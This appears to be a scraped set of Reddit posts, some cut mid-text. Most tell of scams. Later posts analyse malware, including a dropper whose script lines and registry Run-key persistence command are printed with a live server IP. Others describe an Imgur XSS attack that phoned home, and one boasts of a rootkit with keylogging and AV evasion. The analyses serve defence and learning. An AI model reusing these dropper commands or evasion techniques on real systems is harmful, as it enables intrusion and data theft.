after that she moved on to asking for gas money because her car was empty and she needed it to get to my place. at this point i gave up on humouring her and explained that i had already sent her $145 and that she could just use the money for gas and i'd pay off anything outstanding when we were finished. she insisted on having me transfer her more money and i kept saying no. i checked her tinder to double check things and it seemed like it accidentally bypassed some sort of filter because it showed that she was all the way in germany when i live in canada. she sent a snap of her outside and wouldn't you know it, it was pitch black out while the sky was still a bit blue over here.

eventually i just gave up, realizing i was fighting a losing battle and i'd be better off just holding off for the time being. the worst part of it all is since the money was sent online it was autodeposited so every cent was lost forever. i know losing $145 isn't gonna bankrupt me but i'm still super pissed off, both at her and myself. i let mysef get roped into giving away a good chunk of money for free and all i have to show for it is the shame and regret. just had to get this off my chest so i don't accidentally let it slip with my big mouth.

1588672146.0,Working as a scammer on fake dating site.,"Hello there, everyone! I've decided to join Reddit 'cause of this particular story that I was involved in and that is still upsetting me to a gread degree. Sorry for my english, it's my third language.

OK, so, let me start. I live in a not so nice city with huge unemploynment rate and, being a university student with no job, I always take any opportunity to work (well, not ANY, prostitution and drug dealing is not for me :D). 

So, when one day I saw a post from some company looking for a translator I wrote them with no consideration. 

And so I got to the interview.

The interview was ... Weird. It took place in a house similar to a residential one (usually offices of small companies and are located in places like that).

I was asked to come up with ""invites."" I asked what is it? And they answered me that these are ""special sentences to attract the attention of men."" Little by little I finally managed to find out what the essence of the work was. It was based on a site ""Vi\*toria Brides"". BUT! For the 'employees' it was different. ""Pr\*me Date"". I still don't know if these are different sites or the second one is just a covered up part of the first. Covered up from whom? From men. Men, usually in their 40-60-s are still using the ""Vi\*toria Brides"" to find love from Russia or Ukraine. They don't know that their ''loved ones"" don't answer them and probably don't even know english to begin with!

Also, there were only three female workers including myself. Others were young guys my age or older. So, when men were thinking that they were talking to a Elena from Ukraine they were actually talking to Vlad from Russia, yup.

At first I thought that I would be translating letters from men to women and back. But it turned out that everyone in office was given one or two accounts of different women to just... Chat and ask for photos, stickers and gifts. For men EVERYTHING on this site is not free. They pay for texts, for sending pics, for watching videos from women. And their money were going into pockets of women and scammers (well, like myself).

I... Wasn't able to work there more than two weeks. I felt dirty and miserable. In these two weeks I've met two really nice men that I've felt deeply sorry for to these days. They were nice, just really lonely. So, I quit. 

It's already a big post. Well, for me. I'm not used to type so much info at once. :D I'll gladly answer any questions and make other posts about this for you or your relatives not to be scammed. I've been told to deleat all screenshots, but I've managed to save three of them.

My mom called me a couple of days ago about getting into an investment bank and I didn’t think much of it first, but it looks like she signed me and my sister up without our consent. She was recruited by a “good friend” from her workplace and now she’s completely brainwashed.

I think she might’ve put $450 (or more, she might’ve been lying) into the company already and she was telling me about the company and saying something along the lines of ,“the money will double or something by the time she takes it out, something about getting certificates, blah blah.” I honestly could tell something was up and when I looked up the company on Google, the first thing that came up was that it was a scam. I think the company is called GSpartners or something. 

Now she’s asking for our IDs, and from the looks of it, they’re asking her to send a photo of me and my sister’s IDs (front and back) and one of us holding it up to our face. I’m so frustrated and I want nothing to do with this. I’ve already told her multiple times that I don’t want to send them anything, sent her multiple articles about how it’s a scam and now she thinks that I’m ungrateful. She can’t proceed without our information fortunately, but unfortunately, she’s nagging me to send her my ID literally everyday. 

I’m so worried for her, I feel like she’s going to go to other scammy companies to do the same thing and lose a ton of money. I’ve called family members to tell them what’s been going on and everyone is stumped.

1683335744.0,Justice Dept. Seizes Over $112M in Funds Linked to Cryptocurrency Investment Schemes Used In Pig Butchering Scams,"LOS ANGELES – The Department of Justice announced today that it has seized virtual currency worth an estimated $112 million linked to cryptocurrency investment scams commonly called “pig butchering.”

Seizure warrants for six virtual currency accounts were authorized by judges in Los Angeles, the District of Arizona, and the District of Idaho. In the Los Angeles matter, a United States magistrate judge authorized the seizure of an account containing approximately $66.4 million in various cryptocurrencies after finding probable cause that the funds were derived from wire fraud schemes.

According to court documents, the six virtual currency accounts were used to launder proceeds of various cryptocurrency confidence scams. In these schemes, fraudsters cultivated long-term, online relationships with victims, eventually enticing them to make investments in fraudulent cryptocurrency trading platforms. In reality, the funds sent by victims for these purported investments were instead funneled to cryptocurrency addresses and accounts controlled by scammers and their co-conspirators.

“The victims in Pig Butchering schemes are referred to as ‘pigs’ by the scammers because the scammers will use elaborate storylines to ‘fatten up’ victims into believing they are in a romantic or otherwise close personal relationship,” according to the affidavit in support of the Los Angeles seizure warrant. “Once the victim places enough trust in the scammer, the scammer brings the victim into a cryptocurrency investment scheme.”

The scammer attempts to create the appearance of legitimacy by fabricating websites or mobile apps to display a bogus investment portfolio with large returns, the affidavit states. In relation to the Los Angeles-based account seizure, the FBI has identified at least 10 victims who were unable to withdraw funds they had invested, with the seized account containing some funds from all 10 victims.

Authorities executed the Los Angeles seizure warrant in December and received the last transfer of cryptocurrency on March 21.

1691022252.0,I got scammed. Yes I know I’m an idiot.,"
I got an email from my “boss” today asking if I could run out and grab some gift cards as a reward for some of our employees. I’m an intern and I just started this job, so being eager to please I agreed to. He asked me to buy two gift cards for $500, and said he’d reimburse me when he got out of a meeting. I got them and sent them to him, and then he asked me to go get some more. That was when I realized something was off, so I messaged my boss through Slack to confirm and he told me he had not asked me to get any gift cards. 

It turns out, a scammer hacked my boss’s email and was able to figure out his name, my name, and all my contact information. So now I’m out $1,000, which is a lot of money to me considering I’m a broke college student. 

I contacted the gift card company, and they said there was nothing they could do. I called my bank, and they said they couldn’t do anything until the payment was fully processed (likely in the next few days), but even then they couldn’t guarantee I would get my money back. 

I’m at a loss for what to do. If anyone could give me any advice, I’d really appreciate it.

Also, I already think I’m the world’s biggest idiot right now so please go easy on me.

Turns out she had a voicemail from a private number. She played the voicemail for me. It was of some woman hysterically claiming I had an affair with her starting in January and that I just recently called it off.

She says she was pregnant with my kid and was mad that I called off the affair.

She called my wife a few times the same day but hasn't called back yet since.

What kind of scam is this? Money for proof of the affair or something?

UPDATE: Been over a week and not a single callback after the original call/voicemail.

1655719542.0,"""Neighbor"" left a note at my door stating their findmydevice app was pinging to my address.","Hey, all. I've been directed over to this sub from legal advice.  

About two days ago, my roommate answered the door to someone with a letter stating that the application findmyphone has pinged their phone to our address. 

The letter said they would be contacting the police if we do not hand the phone over, but the thing is, we are all confused as to how the phone ended up in our house, supposedly. 

I say supposedly because this situation does not make sense. 

We only live next to two other houses. There's a main road that leads from the exit down past our house. We live off of a side road, and our house is the last house on the back of this road. I hope that makes sense, I don't really know how else to explain it. 

So, anyway, we contacted the people who left the note and they said they were going to the gas station that's near our house and it fell off the hood of their car. 

But they gave us their address and they live on the other side of town, no where near our house. Our house isn't even in the path to go to said gas station from where they live.

I guess my question is, can police get a warrant sorely based off an app pinging the phone to our location? do they need more proof that the phone is at our house? 

We've looked everywhere near and in the house for the phone and we cannot find it.

Okay so, I’ve had my fair share of experiences in my life. As such im fairly aware of this being an occurrence in suburban neighborhoods where random people off dating websites will use random addresses to try and lure people out. Either to scam them, troll them, rob them, or all of the above.

Now as much as I’m aware of this, I’ve NEVER seen it happen in the city before! I live in NYC, and am in a apartment building, this shouldn’t be happening. I only just recently moved here (5 months ago), I’m unsure if perhaps this was an old address of someone else?..

Just today, two guys showed up about an hour apart from one another. First guy said his name and I told him I don’t know him and he probably rang wrong door. I told him I’d let him in the building though (bad mistake of my part, it’s just that it’s commonplace where I live for people to be locked out of a building or be looking for other tenants). Once he arrived to my door and knocked again, I reminded him that he likely has the wrong person. He decided to leave. About an hour or less later, another person arrived. I looked through my buzzer system and saw yet another random individual, I asked who, he told me his name. I told him he probably has wrong person/apartment. He hears my voice and says “no, we were talking on Grinder.” I exclaim, what no you’ve got the wrong person. And shut it, my thoughts are that someone is either using my address or that one of those two decided to try and meet up here. Which still doesn’t make sense to me…

Im tired of these people showing up. I came today to see if anyone knows of something that I can do to stop/prevent this from continuing to happen?

She had first told me that her client would be paying mobile deposit which I immediately said that I would never give out my checking out routing #. She said that was no problem and that they will be emailing a check and just needed my bank for endorsement. 
Then she said “I hope you understand that you will be receiving a check of $3000 and you’ll help me send $2500 through zelle or venmo to my supplier for the painting materials to aid the project due to the fact that I have a chargeback dispute on my account so it’s not wise putting it on the account which might affect your payment.”.

1564782376.0,eBay Macbook scam - Weliky Group,"I  had an elderly woman come in a few weeks ago to fix her broken macbook  pro she bought on ebay from a vendor called Weliky.  She claimed that  she had a 3 year warranty on the laptop, as I proceeded to explain to  her that the model she had was legacy (2011) and that there was no way  you could have any type of warranty on a used laptop, she started to  cry.

I looked up this vendor  Weliky on ebay and just could not believe what I was seeing.  This  Weliky was selling used macbook pros with deceptive tactics calling an  SSD drive SSD H, which is not a real SSD drive to begin with.  These  hybrid drives are some of the worst hard drives you can put into a  computer.  Weliky is also selling warranties on USED laptops with used  parts, which is illegal.  Also they are not listing specific models in  their listings claiming 2012-2014 models upgraded to 2019, which is also  deceptive.  You really don't know what your buying until it arrives in  the mail.

I  had a look at  Weliky's feedback and noticed he was buying used parts from other ebay  sellers, that's when I began to dig.  I purchased the laptop this  elderly lady brought in and sold her a new macbook pro.  I tore down the  laptop piece by piece and examined all the parts.  Little does Weliky  know that most components come with a serial number.  After running the  parts through a database I discovered that the screen, ram,  battery and  hard drive were all in fact used pulled from other devices which  explains why weliky is buying used components from other ebay sellers.

Upon  more research I have found out that the vendors ""Illinois Precision   Group"" and ""Highland Systems"" all stem from the state of Illinois.  I  noticed the pictures used in the listings looked the same so I ran a  Geo-tagging scan on the pictures from precision and highland and they  both matched the geo-tagging from weliky's listings.  So it is now known  that Illinois Precision and Highland Systems are both owned and ran by Weliky.  This is also illegal, you cannot own 3  companies and run them against each other competitively. .These guys get a lot of bad feedback and then convince buyers  to change the negative feedback into positive ones after ""upgrading"" or  buying back their own products:

These  3 negative reviews are just from the past week then they change to  positive, I can only imagine how many times they have done this in the  past year.   Also to mention that if you are doing more then $100,000 in  sales per year in apple products you must register with apple as an  authorized reseller, after speaking with my superiors at apple neither  of these 3 companies are registered with apple to resell apple products.   Apple also mentions that anyone repairing apple products must be a  certified apple technician that has any interest in the companies and  apple has verified that neither of the owners are a certified  apple technician.  After documenting my findings and taking a statement  from the elderly woman who wishes to remain anonymous on this board, I  have contacted the FBI Fraud Dept in the Northern Illinois District and  turned over all documents and evidence as well as the IRS, Apple, the BBB, Ebay and Paypal.  The charges they are facing are defrauding an  elderly person using interstate commerce, violating Section 5 of the  Federal Trade Commission Act, which bans “unfair methods of competition”  and “unfair or deceptive acts or practices"", selling fraudulent  warranties and selling counterfeit merchandise in interstate commerce.   In order to refurbish an apple laptop one must use brand new original  certified apple parts if not the item is deemed counterfeit.

So  far we have made 3 controlled buys from Weliky, Illinois Precision and  Highland Systems and after dissecting each component it is fully  confirmed that they are using used or possibly broken parts reselling as  new.  I am a certified Apple Tech at Apple out of New York City where  we have filed criminal complaints in the Federal Southern District of  New York and Northern District of Illinois.  I advise that all other victims of Weliky also known as Illinois Precision  Group and Highland Systems to come forward with their claim as we are  also putting together a lawsuit against the defendants.

He said that they would mostly be doing sign holding. A few commenters have said that sign holders do make pretty damn good money on a seasonal basis. 

“As for the job, yeah sounds iffy. Although after the 2017 hurricane, you would see only females directing traffic for subcontractors working on the road. Those were seasonal jobs and paid extremely well for a couple of months worth of work. They just usually hired locals, personally had a friend that worked 3 months just directing traffic when a power brigade was blocking the roads.” r/pulguinuni 

So who knows. It could be legit like he claims it is, but it definitely doesn’t seem like it’s worth the risk. We’ve talked about it, I’ve shared the dozens of comments here with her, and she’s not planning on going. The risk is too high. Thanks everyone. 

So my girlfriend (Anna) lives with her best friend (Shana) and the other day Shana’s ex-boyfriend hit Shana up about an opportunity for her and Anna to go work in Puerto Rico for 3-6 months providing hurricane relief. He said the pay is very good ($8,000/month) which is already sketchy because my girlfriend is a server and has zero training in building/infrastructure/power grids or literally any skillful labor you would need after a hurricane, so why would they offer to pay her almost 6 figures? On top of that, he said all expenses would be paid for while they are down there. He also said they specifically needed females. Which is another huge red flag. He will not provide detailed information about what they would be doing, and said they would need to leave within a days notice of the company telling them to get on a plane. 

He mentioned that the company they would be working through is called Bird Electric. I did find their website here: https://birdelectricinc.com/amp/

Their website seems shady af. For example, they don’t even have a favicon on google, it’s just the standard Wordpress one. And the whole thing just looks amateur, I could build a better website in an hour. They have some pretty bad reviews, but also some positive ones. 

This all just seems like a sex trafficking scheme or something. I basically told Anna there is absolutely no way in hell you are going down there to do this and I highly suggest you tell Shana the same thing as it sounds very dangerous as something clearly is wrong here.

1669787483.0,Don’t use Resume-now if you need a resume,"About 4 months ago I used Resume-now to build a resume. It said it was free and I believed it. After my resume was built the pdf was watermarked heavily and put behind a paywall. It was only like 2-3 dollars and I spent a good while making it so I figured I might as well buy it once so I could have my resume I spent all that time on. Or it wanted me to sign up for a free trial. Either way I’d do it and cancel the subscription. After I printed it out and saved the pdf I thought I cancelled the subscription. It asked me if I was sure and I said yes. Then It said I successfully canceled my subscription. Fast forward to today. I look in my bank app and see $23.85 come out of my account. I find out it’s from resume now and I go to the website and it says I’m still subscribed. I go to look at account info and it shows that I’ve made 5 of those payments of 23 dollars for the past 4 months. I’ve only used the service once so obviously I want a refund. I go to cancel my subscription first and it asks if I’m sure. I click yes. Then it asks if I want to change the subscription to add more services. I click cancel anyway. It asked me the same thing again. Then again. Then it finally sent me an email confirming that I cancelled. I know for a fact that I cancelled the first time. I look at the reviews and see that I’m not the only person this happened too. Hundreds of other people have said that they’ve cancelled and still have been charged without realizing it. Which makes me think that when the account goes to cancel the first time it pretends it goes through but after a while it goes back to being active. Dirty trick. One of the reviews say that they lost 300 dollars and only got 3 payments refunded. I talked to the billing department and they said they would refund one whole payment but originally only would do half a payment. And I got and email after a couple hours saying they would refund me the half payment. I gave up because I knew I was done with the subscription and they said I wouldn’t be charged anymore but I’m watching my account like a hawk now

1.) Scan with virustotal.com

Two main things to note here.  
  
- Connection to www.myflare.com under ""Network Analysis""  
- 3 dropped files  
  
3.) Investigation!  
  
Dropped file 1  
  
inst.js  
  
> var WSHShell = WScript.CreateObject(""WScript.Shell"");  
WSHShell.Run('set.cmd',0);  
WSHShell.Run('run.cmd',0);
  
It runs 2 other files. But where do those come from?  
  
Dropped file 2
  
down.js  
  
[Pastebin Link](http://pastebin.com/7vAb4rqE) -  **WARNING - Those MyFlare files are live - Take caution!**  
  
Ok - That's a little more significant. It downloads 4 files. set.cmd and run.cmd are then run by the first dropped file - inst.js  
  
Let's examine those  
  
runs.exe - Toss it through ProtectionID and we get this - [Picture](http://i.imgur.com/1zd4rIF.png) - It's the 7zip extractor. That small mystery solved.  
  
Next downloaded file - Simply called ""file"".  
  
Rename it to a .txt, open with Notepad, and the first 3 characters show ""7z¼"" - Possibly a 7zip archive. Rename the file to .rar, open with WinRAR, and we get...  
  
[Picture](http://i.imgur.com/76p33Cs.png)  
  
The NVidia Display settings in a compressed passworded file? That's weird. Anyways - Carrying on. The next downloaded file!  
  
run.cmd - Open with notepad, and we get  
  
> reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /f /v ""nvxdsync32.exe"" /t REG_SZ /d ""%APPDATA%\Security\nvxdsync32.exe""
  
Hmmm - So it seems that NVidia driver is more than it appears... But the archive is passworded. Hopefully the final file will shed some light on matters!  
  
set.cmd  
  
[Pastebin Link](http://pastebin.com/1hQMyz7K)  
  
Ok - Wow. This does a lot of stuff. A line that sticks out is  
  
> ""%APPDATA%\runs.exe"" x -pferum -y ""%APPDATA%\file"" -o""%APPDATA%""
  
Remember ""runs"" was the renamed 7zip extractor? Well - What do we have here... ""-pferum"" ? Password of ""ferum"" ? Test, and....  
  
[Picture](http://i.imgur.com/qEFcRWz.png) - It Extracted - In a hidden folder!  
  
Open it, and... [Picture](http://i.imgur.com/7ORcF8a.png)  
  
...  
  
So where are the rest files?  
  
Well, it seems that set.cmd also plays around with folder permissions a bit... So let's try find them!  
  
[Picture](http://i.imgur.com/EbS8q0n.png) - Yup - There they are!  
 
After a bit of fiddling around - GOT THEM! - 
[Picture](http://i.imgur.com/WzAWfYg.png)  
  
So - What's so special about that NVidia config file now... ? Right-Click Properties, and.... That doesn't look right! - [Picture](http://i.imgur.com/C2i3r0s.png)  
  
Do a bit of research on Net Support, and we figure out that it's a piece of Remote Desktop software. Who would've thought!  
  
4.) The End  
  
Now, this is unfortunately where my little adventure ends. For you see, whilst I was able to acquire a trial version of the Net Support software (It's a legitimate piece of software), I was unable to connect to his server, as I was unable to decipher the Gateway key he used.  
  
[Config file - Picture](http://i.imgur.com/Jg0YblC.png)   (Well well Mr Dew of Germany...)  
  
[Vague decryption attempts - Picture](http://i.imgur.com/hrLiZII.png)  - I could input characters and get an encrypted output. I had the output I needed, although I couldn't figure out the input. This is a sample of the input / output.    
  
Unfortunately my Cryptography skills are insufficient, so here the story ends. I am simply one powerless individual, so am unable to do anything about tracking down the server IP - 46.165.206.78 - Currently online as of posting.  
  
I hope you had a good read, maybe learned something, and enjoy the rest of your day!

- General overview, about me, why and how I got into malware, why I'm not an expert, how you can be an expert, and more


- Windows PE format (IMAGE_DOS_HEAD, IMAGE_NT_HEAD, IMAGE_FILE_HEADER, IMAGE_OPTIONAL_HEADER, and all of the associated IMAGE_DATA_DIRECTORIES and how the PE headers can be used to harvest data on a target executable.


- How to parse the PE headers programmatically in C without usage of the WinAPI


- How to use the PE headers to dynamically load API functions to avoid standard user-mode heuristic analysis (and how to avoid hard-coding function addresses)


- Introduction to PE infection


- Parasitic Infection (overwrite, appending, prepending)


- Cavity Infection


- Fractionated Cavity Infection


- File System Octopus concepts


- Amoeba Infection


- Embedded Decryption / Encryption (stub file, multi staged infection)


- Entry Point Obscuring / Code Integration


-  IAT hooking / hijacking


- Advanced / Next generation malware (APT malware theories) such as Polymorphism mutation engine and the infamous and legendary Metamorphic mutation engine.


- Advanced Rootkit concepts such as DKOM for process structure manipulation and winsocket manipulation


- Other neat stuff I've found: unknown / undocumented data locations and how you can utilize them, how to XOR your strings easily, how to hash your API strings to remove unnecessary POSIX calls (or how to remove them entirely)


I won't have any notes on this stuff. I will literally be in my chair, sitting Red Bull, and shooting the shit with you guys and sharing my knowledge. I want ALL of you to contribute, give feedback, share what you've learned, and more. Also, can someone help me set this whole thing up? I've never done a live stream before. Thanks everyone :)

1442945872.0,Imgur Exploited by blackhats,"NOTE: This exploit has been resolved already.

From /u/korri123
EDIT: http://pastebin.com/heYvWu5Y 
Some tl;dr about what we know

    hacker manages to inject JavaScript code into imgur. source: https://archive.is/JaJmO 

    JS loads a flash swf. decompiled swf shows this AS3 code: http://pastebin.com/ytfKq2Mw 

    swf injects saves javascript into localstorage. injected code here: http://pastebin.com/XUssBG5z 

    Javascript injects more javascript into the page and evals it. src: http://pastebin.com/myxtBWjh 

    Javascript loads something remotely with the url ""'hxxps://8chan.pw/ (Is actually https,  just switched it to hxxp so people don't accidently click it). 
    a_this.uaf"" but uaf is a secret that is calculated somehow. Would have to examine (or just run) the code to figure out what the url is.

    uaf file is being decrypted as of now

    it returned nothing useful

    edit: it actually did return a space when refered to 4chan.org. maybe some other url will return something useful?

this is what needs to be researched (for any of you javascript and web nerds)

    (#3)

Guesses include client-side involuntary DDoS on both/either 8chan and 4chan








From /u/ItsMeCaptainMurphy:

This isn't a DDOS. It's targeting 8chan users and leaving javascript code in their local storage that causes their browsers ping back to a command and control server each time they hit an 8chan page. Thus far the C&C server hasn't sent out any commands (or stopped issuing commands before this was discovered). Over the evening whoever authored this has been updating and changing their code. It only effects very specific imgur images/pages. Why is not yet known.

Things to take away:

If you visit imgur and 8chan you may very well have a big issue. Clear your localstorage (go to 8chan, open your browsers console, type localstorage and see what's there - then type localstorage = [] and hit enter) as well as all browser private information (cookies, passwords, offline storage, etc). See edit #4 for a better way to ensure you're safe. Don't go to 8chan before clearing all local storage.

Imgur is compromised. This is the big one and should be very worrisome to anyone on this site. There are three possibilities:

1.) There is an exploit in how imgur processes images that allows someone uploading an image to get code injected into the page when someone else loads the image from imgur

2.) Imgur has one or more servers that are compromised

3.) Imgur has a rogue employee injecting malicious code.

In all cases, this is really, really bad. It's very unlikely that a 0day exploit on a site as big as imgur is just being used to go after 8chan (unless it's case 3. and someone has a grudge). This allows whoever knows how to take advantage of the exploit to launch an XSS attack against anyone who visits a malicious page on imgur. And there's no way to tell before visiting the page. Not all pages on imgur are compromised and right now it appears to be a very small number of images that had malicious payloads sitting on their page.

How the attack appears to have worked:

1.) Malicious javascript got onto imgur's server somehow (via one of the three routes outlined above)

2.) This js created iframes and embedded a flash file hosted on 8chan. The iframe was off screen so a user would not notice. Since imgur typically uses flash for parts of its functionality flash asking to run on imgur wouldn't be seen as suspicious.

3.) This flash file injected more javascript into the page (while on the surface looking like an innocuous pikachu animation). This javascript was stored to the user's localstorage (which, since the iframe was pointing at 8chan, allowed the attacker to attach js to 8chan's localstorage). It's functionality is to issue a GET request to 8chan.pw (not an 8chan server AFAIK) and then decrypted the response. So far no one has been able to see a response from that web service, meaning it likely wasn't activated yet or has already been deactivated. The outcome is that every time a user visited an 8chan page, it would ""phone home"" to check for instructions and then execute more javascript code.

I would stress that everyone should disable flash and javascript on imgur for the time being. This attack may not be the only use of this exploit and a lot of very, very bad things could be done through XSS if more people are exploiting this. You should treat the entire site as potentially compromised until imgur addresses this and explains what happened.

1439749086.0,PSA: Advanced Malware Analysis by Christopher Elisan not worth your time,"Don't know if this is appropriate here, but I figured it was worth a shot.

I just got a recommendation and was interested reading the writeup. However reading the review on the book changed my view. Thanks to Amazon reviewer Jim Bartels for the review below:

This book is in no regard about ""Advanced"" malware analysis like the title suggests. It is not even an introductory malware analysis book. All the book covers is how to install various tools that you would need to start with malware analysis 101. The books doesn't show disassembly of malware, it doesn't discuss any Windows API calls or any other Windows internals. The book doesn't even teach you what malware really is.

The first chapter (page 6) contains the following gem: ""Static analysis is the easiest [...] malware analysis process. [...] It is as easy as clicking some buttons or using a command line"". This sums up the book pretty well: according to the author, malware analysis is mostly about installing tools and clicking some buttons. That might be part of it, but I don't consider that ""Advanced Malware Analysis"" or even ""Malware Analysis"".

What does the book tackle then? The book is mostly filled with screenshots and very detailled tutorials how to install tools.

You got screenshots of the Windows update settings, the Windows 7 security settings, the user account settings, the word option setting. You even got a full page dedicated to a screenshot of xcopy.exe copying some files.

An then you have tutorials. There are 25 pages dedicated how to install and use gpg to encrypt malware for moving it from source to analysis machine. Or tutorials how to install InstallRite. Of course accompanied by four screenshots of the install wizard with the options to click Next or Cancel.

Chapter 11, ""Inspecting Static Malware"", is finally dedicated to analysing malware. It is only 19 pages long and contains the following tutorials: how to identify the file type with ""file"" for PEid"", how to upload the file to Virustotal (of course we get to see two pages of Virustotal screenshots), and how to use ""strings"" to extract the strings. THAT'S IT!

Malware Analysis is not about installing tools and you certainly don't need pages and pages of screenshots and step by step instructions on how to install zip or wireshark. If you need help with that, you can easily find better tutorials online. If you really want to learn about Malware Analysis, I highly recommend the book ""Practical Malware Analysis"".

1663221239.0,Novel PDF malware: injecting JavaScript into the encrypted section of Adobe Type 1 font binaries is not detectable by malware scanners and doesn't interfere with decryption/decompilation of the font (along with a new tool for malicious PDF analysis),"See [this Twitter thread](https://twitter.com/Cryptadamist/status/1570167937381826560) with most of the details/screenshots/virustotal links/etc.

Apologies if this isn't new but the fact that none of the malware detection tools alert on it coupled with the fact that I could find nothing about this sort of thing on the internet suggested to me that it was a new kind of thing. No idea if this exploits a still extant vulnerability or an old one.

The tool is the [the pdfalyzer](https://github.com/michelcrypt4d4mus/pdfalyzer); I just open sourced it. Meant to fill in some gaps around pdf-parser.py and the rest of Didier Stevens's malicious PDF toolkit. Makes pretty charts, previews data streams, and (most importantly) digs through PDF font binaries for potentially executable stuff. Example output can be seen at the GitHub link.

I'm not a cybersecurity guy, just a guy with some computer skills who had to brush up on his security chops in a hurry when I was recently victimized by the PDF in question, so I haven't solved this puzzle entirely.  I know the Javascript is there, lurking, but I can't figure out what it actually *does.*

At least when it comes to the specifics.  When it comes to the lived experience I know that rendering this PDF opened a backdoor onto a machine on my network¹  through which the attackers proceeded to compromise a large number of my devices via the crazy macOS/iOS vulnerabilities Apple disclosed last month¹.

If you have any tips on how to deobfuscate the JS or otherwise figure out what the malicious code is actually doing I'd love to hear about it. I tried a couple things:

1. Didier Stevens \``xorsearch.py` didn't work, though I did note that \``xorsearch.exe`, the windows version of the tool which I have not tried, had a lot more features/could brute force orders of magnitude more possibilities.
2. python's `chardet` library, which is theoretically able to guess an encoding for any chunk of binary data, failed miserably at both the entirety of the binary as well as the chunks I extracted from between the backtick and guillemet quotation marks
3. hunting around in the PDF for some kind of number that could serve as a rotation key (or similar annoying-but-not-terribly-sophisticated encryption scheme) to deobfuscate the rest of the JS code. there's a bunch of numbers in the various PDF objects - stuff like character width, page position, etc etc are all numbers - but all of them seemed to have a legit use case according to Adobe's official PDF spec.
4. checking the binary for stuff that looked like a regex. there was *definitely* stuff that looked like a regex and now that I think of it again I will try to get some screenshots of that stuff, but the the potential regexes I checked never really added up to regexes (or I missed it)

**update**: someone suggested I run it through hybrid-analysis, which I though I had done... but [I did it again anyways](https://twitter.com/Cryptadamist/status/1570342710988644352). HA still comes back green like I remembered but this time I looked a little closer at the results and there's a decent amount of stuff that's indicative of malevolent intent.

**update2:** [Link to tria.ge report](https://tria.ge/220919-bnr8paecbj/behavioral2) someone put on twitter. also just to clarify exactly where I burned out on this - I was trying to read the `t1disasm` code to see what would cause it to skip and/or stop decrypt at a given byte to see how it could be possible that a string like `/FJS\`\xbb\`` could avoid interfering with the decryption of the type1 adobe font, but I burned out before getting any kind of answer.

**update3:** (2022-09-20) [Posted some new screenshots](https://twitter.com/Cryptadamist/status/1572364141771522049) of various less garbled attempts to guess an encoding for some of the stuff in the JS regions of the font binaries

1506910454.0,Thinking about doing a twitch stream or something discussing malware,"Hi all. I'm a software engineer who has been passively studying malware for almost a decade now.

I am not a mega expert by all means, but I can hang with the best. My biggest fault is I'm not good at reverse engineering malware, only developing malware (which seems to be opposite of most malware experts?)


Anyway, I've been writing an experimental computer virus for a few months now and it's officially transformed into a Rootkit. It has the following functionality:


- Completely position independent, makes no direct function calls. Does this by parsing the export address table of NTDLL.dll on load.


- Rewrote several windows kernel32 functions to avoid unnecessary function imports (GetLastError, SetLastError, GetEnvironmentVariable, SetFilePointer, LoadLibrary, GetModuleHandle to name a few...)


- Programmatically escalates to admin using an unpatched exploit


- (work in progress) programmatically escalates to SYSTEM but cloning SYSTEM process security tokens


- Hooks user keyboard input on the hardware level


- (work in progress) Fractionated Infector cryptor for infecting files


- (work in progress) File system octopus injector (fractionated resource file injection


- (work in progress) Steals valid Microsoft signatures to avoid AV detection


- (work in progress) modified system process block to hide process from task manager


- (work in progress) additional evasion stuff...


- thread context switching, executes unnecessary junk instructions randomly to make it more difficult to reverse engineer


- anti virtualization technology (phony Op codes)


- Self debugging mechanism to make it more difficult to debug 


- all strings are XORd (no strings, cannot sting dump)


- original code is packed and compressed

- Basic reverse engineering questions like, ""what's the difference between cdecl, fastcall, and standardcall?""

- Questions about my fuzzing and vulnerability research experience

- Questions about how many malware samples I had analyzed in the past - the answer to this one was ""not many"", but I was able to pull out some cool stories about packers I had tried reversing

- Questions about my (at the time) upcoming attempt at the OSCE that went into fuzzing and my exploit development knowledge

That was supposed to be the soft skills interview but the guy took it in a more technical direction that I appreciated. Technical interview is today, wish me luck!

Edit: Just got out of an interview, fairly intensive because there were 4 different teams looking for interns. Position was capabilities development focused, which was fun. They were a bit skeptical because I was a freshman, but once we started talking they warmed up.

Intro team, malware analysts: Asked me generally to describe my experience then dug into specifics like how I would backdoor a PE (interviewer said he likes that my answer was more in depth than ""find a code cave and insert code"", so keep that in mind. Wanted to hear a lot about network protocol reversing experience.

RE Generalists: Asked me about a lot of the tools I used to do RE such as GHIDRA and IDA Pro. Asked me what I liked and didn't like about both, focused on capabilities. 

Malware analysis team: Asked me what I would do if I was given a sample, tools and methodology. Liked my answer, but clearly hoped it would have been both windows and Linux oriented. Asked about CTF experience, which I don't have much of but had cool binex stories from.

Exploit development team: CTFs, lot of CTF's, I haven't done many CTF's but they wanted me to do more CTF's and wanted to hear about CTF experience. Asked me about my shellcode writing experience and methodology. Asked me about tools I had developed to facilitate exploits.

Project lead: Put some C code in front if me and asked me if I could figure out what it was doing, which took me a bit, and where the bug was. Not too bad, but I took a little bit to answer because my familiarity with some C concepts isn't where I wish it was.

Ideal candidate profile:

- Comfortable with low level development, both arm and x86

- Comfortable reversing network protocols

- Comfortable with python

- Comfortable in both user and kernel mode, seeing a lot of desire for kernel mode work at a lot of companies this year

- Comfortable with C concepts including linked lists

- Comfortable with offensive RE for x86, .NET, and embedded software

- They seem to really like people who upload low level projects and python tools on GitHub because it gives them an easy metric to measure you by

- Some of them read my blog posts and were interested in my projects, so that's another avenue

Hopefully that helps you guys look for where to focus! This is 1 out of 3 companies I'll hopefully be interviewing with for RE/Malware/Vuln roles.",Malware,4343,752,92,1
1525475838.0,Ransomware on Android,"If this isn't the correct subreddit for this please PM me with a better suggestion.  
  
I work at an AT&T Authorized Dealer (cell phone store) in the middle of nowhere, where phone-illiterates are grown. Today I've had the enjoyment of dealing with a ransomware app for a customer's Kyocera Hydro, a very inexpensive phone. Customer claims his teenage son was messing with the phone for a while and returned it with the ""FBI warning"" on the screen, demanding a payment via prepaid debit card.  
The app covered the entire screen preventing any interaction and making access to the settings impossible.  
I booted the phone into SAFE mode by holding down the volume down and power buttons until it restarted, letting go of power once it turned back on (other phones will work differently).  
Once it rebooted it asked for a pincode, of which the customer has never set. Luckily after a couple of failed attempts, the phone offered a ""forgot pin?"" option, to my understanding isn't a very common feature. More luck ensued as the customer remembered their Gmail and password, from their I was given the option to remove the pin all together.  
I looked through the installed apps to find the culprit, determined it to be the outlier of typical bloatware, ""PornHub."".   
